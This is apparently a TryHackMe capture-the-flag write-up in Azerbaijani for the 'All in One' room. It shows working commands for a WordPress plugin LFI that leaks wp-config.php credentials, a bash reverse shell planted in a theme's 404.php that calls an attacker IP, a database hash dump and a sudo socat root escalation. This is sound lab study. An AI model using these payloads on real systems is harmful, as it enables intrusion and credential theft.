# TryHackMe — All in One | Writeup

**Room:** [All in One](https://tryhackme.com/room/allinonemj)  
**Çətinlik:** Orta  
**Autor:** i7md  

---

## Reconnaissance

### Nmap

```bash
nmap -sV -sC -A 10.80.186.150
```

**Nəticə:**
- `21/tcp` — vsftpd 3.0.5 (Anonymous login açıq)
- `22/tcp` — OpenSSH 8.2p1
- `80/tcp` — Apache 2.4.41

---

## Enumeration

### Gobuster

```bash
gobuster dir -u http://10.80.186.150/wordpress/ -w /usr/share/wordlists/dirb/common.txt
```

WordPress qovluğu aşkar edildi.

### WPScan

```bash
wpscan --url http://10.80.186.150/wordpress/ --enumerate u,p,t
```

**Tapıntılar:**
- User: `elyana`
- Plugin: `mail-masta 1.0` — LFI vulnerabilitiyə malikdir
- Plugin: `reflex-gallery 3.1.7`
- WordPress versiyası: `5.5.1` (köhnə)

---

## Exploitation

### Local File Inclusion (LFI) — mail-masta

`mail-masta` plugini LFI-a açıqdır. `php://filter` wrapper ilə `wp-config.php`-ni oxuduq:

```bash
curl "http://10.80.186.150/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php" | base64 -d
```

**`wp-config.php`-dən əldə edilən məlumat:**
- `DB_USER`: `elyana`
- `DB_PASSWORD`: `H@ckme@123`

> **Qeyd:** Birbaşa fayl yolu ilə oxumaq mümkün deyildi, çünki PHP faylı execute edir. `php://filter` isə faylı base64 formatında raw şəkildə qaytarır.

---

## WordPress Admin Access

DB şifrəsi ilə WordPress admin panelinə daxil olundu:

```
URL: http://10.80.186.150/wordpress/wp-admin/
Username: elyana
Password: H@ckme@123
```

---

## Reverse Shell

WordPress admin panelindən **Appearance → Theme Editor → 404.php** faylına reverse shell kodu əlavə edildi:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.138.73/4444 0>&1'"); ?>
```

Kali-də listener:
```bash
nc -lvnp 4444
```

404.php trigger edildi və `www-data` shell əldə edildi.

---

## Privilege Escalation — www-data → elyana

### MySQL-dən hash əldə etmək

```bash
mysql -u elyana -p'H@ckme@123' -e "use wordpress; select user_login,user_pass from wp_users;"
```

**Hash:** `$P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1`

### Gizli fayl

```bash
cat /etc/mysql/conf.d/private.txt
```

Fayl base64 encode edilmiş şifrə ehtiva edirdi:

```
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```

```bash
echo 'VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259' | base64 -d
```

Bu şifrə ilə SSH:
```bash
ssh elyana@10.80.186.150
```

**User flag** əldə edildi: `cat ~/user.txt`

---

## Privilege Escalation — elyana → root

### Sudo icazələri

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/socat
```

`socat` sudo ilə NOPASSWD çalışır — root shell mümkündür:

```bash
sudo socat stdin exec:/bin/bash
```

**Root flag** əldə edildi: `cat /root/root.txt`

---

## Əlavə Vektorlar

Bu box-da bir neçə alternativ yol mövcuddur:

- **LXD group** — elyana `lxd` qrupundadır, container mount ilə root mümkündür
- **reflex-gallery** — arbitrary file upload exploit (Exploit-DB)
- **WPScan brute-force** — `elyana` üçün rockyou.txt ilə şifrə tapmaq

---

## İstifadə Edilən Alətlər

| Alət | Məqsəd |
|------|--------|
| nmap | Port scan |
| gobuster | Directory enumeration |
| wpscan | WordPress enumeration |
| curl | LFI exploitation |
| mysql | DB enumeration |
| nc | Reverse shell listener |
| socat | Privilege escalation |

---

## Öyrəndiklərimiz

1. **LFI + php://filter** — PHP fayllarını execute etmədən oxumaq
2. **wp-config.php** — həmişə DB şifrəsi saxlayır
3. **Sudo misconfiguration** — NOPASSWD olan hər binary təhlükəlidir
4. **Şifrə reuse** — DB şifrəsi = SSH şifrəsi

---

*Writeup by: CTF Player | TryHackMe — All in One*
